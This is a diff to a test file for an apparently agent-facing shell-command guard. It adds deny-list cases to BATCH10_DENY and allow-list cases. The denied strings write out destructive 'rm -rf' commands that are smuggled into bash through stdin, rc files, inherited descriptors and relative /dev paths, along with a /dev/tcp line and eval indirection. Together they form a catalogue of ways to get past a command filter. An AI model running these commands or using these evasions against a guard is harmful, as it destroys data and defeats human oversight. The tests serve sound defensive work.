@@ -468,6 +468,21 @@ BATCH10_DENY = [
     "bash /proc/1/fd/0 <<< 'rm -rf x'",
     "bash /proc/thread-self/fd/0 <<< 'rm -rf x'",
     "bash /dev/tcp/example.com/80",  # any other /dev or /proc path: fail closed
+    # automated security review of aff06b0: any input a shell gets is treated as code
+    "bash --rcfile /dev/fd/3 3<<<'true' <<< 'rm -rf x'",  # rc file and stdin both read
+    "bash -es x.sh <<< 'rm -rf x'",  # an option cluster with s reads commands from stdin
+    "bash -is x.sh <<< 'rm -rf x'",
+    "bash dev/stdin <<< 'rm -rf x'",  # a relative device path
+    "bash ../../../../dev/stdin <<< 'rm -rf x'",
+    "bash -c 'bash' <<< 'rm -rf x'",  # -c code that reads stdin
+    "bash x.sh <<< 'rm -rf x'",  # stdin of a script may be sourced: checked too
+    "cat payload.txt | bash -c 'source /dev/stdin'",
+    # no visible input at all, only an inherited descriptor: each check stands alone
+    "bash 0>&3",
+    "bash --rcfile /dev/fd/3 -i",
+    "bash ../../../dev/fd/3",
+    # deliberate: a script's own stdin isn't seen, so input to a shell script is denied
+    "bash x.sh < data.txt",
     # known gaps until batch 10, now caught (variables and stdin shells are followed)
     "X=rm; $X -rf build",
     "cmd='rm -rf build'; eval \"$cmd\"",
@@ -517,6 +532,10 @@ def test_batch10_bypasses_are_denied(command: str) -> None:
         bash("bash << EOF\nuv run pytest -q\nEOF"),
         bash("bash --rcfile x /dev/stdin <<< 'uv run pytest -q'"),
         bash("bash scripts/check.sh 2>/dev/null"),
+        # -c code and the positional parameters after it aren't script paths (found by dogfooding)
+        bash("bash -c 'ls /dev/null'"),
+        bash("bash -c 'echo hi > /dev/null; uv run pytest'"),
+        bash("bash -c 'x' arg0 /dev/null"),
         bash("rm ${HOME:+-r} build"),
         # message text mentioning a ${VAR:-default} stays one word (found by dogfooding)
         bash('git commit -q -m "docs: ${F:--rf} expands; f=.env; cat $f is denied"'),
